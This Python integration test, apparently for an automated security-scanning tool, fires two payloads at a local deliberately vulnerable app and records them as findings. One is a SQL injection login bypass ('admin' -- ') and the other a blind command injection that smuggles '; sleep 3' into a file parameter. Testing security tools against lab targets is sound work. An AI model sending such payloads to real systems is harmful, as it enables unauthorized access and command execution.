"""M2 integration check: http_request + finding, straight-line (no LLM, no Docker),
proving V1 and V2 against a LIVE vulnshop at 127.0.0.1:5000.
Run: uv run python tests/test_tools.py  (vulnshop must be running, DB/exports seeded)
"""
import shutil
import sys
import tempfile
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from docket.report.dedupe import FindingStore
from docket.tools.reporting.tool import register_finding
from docket.tools.http_request.tools import do_http_request

TARGET = "http://127.0.0.1:5000"


def test_v1_sqli_and_v2_cmdi_end_to_end() -> None:
    tmp = Path(tempfile.mkdtemp())
    store = FindingStore()
    try:
        # V1: prove the bypass with http_request, then register it.
        payload = {"username": "admin' -- ", "password": "wrong"}
        bypass = do_http_request("POST", f"{TARGET}/login", tmp, data=payload)
        assert bypass["status_code"] == 200 and "Welcome" in bypass["body"]

        register_finding(
            rule_type="sqli",
            severity="high",
            title="SQL injection in POST /login",
            description="username is f-string'd into the SQL query.",
            location={"url": f"{TARGET}/login", "method": "POST", "parameter": "username"},
            poc={
                "steps": [f"POST /login with username={payload['username']!r}"],
                "request": {"method": "POST", "url": f"{TARGET}/login", "body": payload},
                "response_excerpt": bypass["body"],
            },
            discovered_by="test",
            run_dir=tmp,
            on_finding=store.add,
        )

        # V2: blind command injection, timing side-channel.
        baseline = do_http_request("GET", f"{TARGET}/export", tmp, params={"file": "report.csv"})
        injected = do_http_request("GET", f"{TARGET}/export", tmp, params={"file": "report.csv; sleep 3"})
        delay = injected["elapsed_ms"] - baseline["elapsed_ms"]
        assert delay > 2500, f"expected ~3000ms delay from injected sleep, got {delay}ms"

        register_finding(
            rule_type="command_injection",
            severity="critical",
            title="Command injection in GET /export",
            description="filename is concatenated into os.system('cat exports/' + filename).",
            location={"url": f"{TARGET}/export", "method": "GET", "parameter": "file"},
            poc={
                "steps": ["inject `; sleep 3` into ?file= and observe response latency"],
                "request": {"method": "GET", "url": f"{TARGET}/export?file=report.csv%3B+sleep+3"},
                "response_excerpt": f"baseline={baseline['elapsed_ms']}ms injected={injected['elapsed_ms']}ms (blind — os.system stdout not returned in response)",
            },
            discovered_by="test",
            run_dir=tmp,
            on_finding=store.add,
        )

        assert len(store) == 2
        rule_ids = {f.rule_id for f in store.findings()}
        assert rule_ids == {"sql-injection", "command-injection"}
        for f in store.findings():
            assert f.poc.request.strip() and f.poc.response.strip()  # non-empty PoC enforced
    finally:
        shutil.rmtree(tmp)


if __name__ == "__main__":
    test_v1_sqli_and_v2_cmdi_end_to_end()
    print("test_tools: ok — V1 and V2 both found, validated, and registered end-to-end")
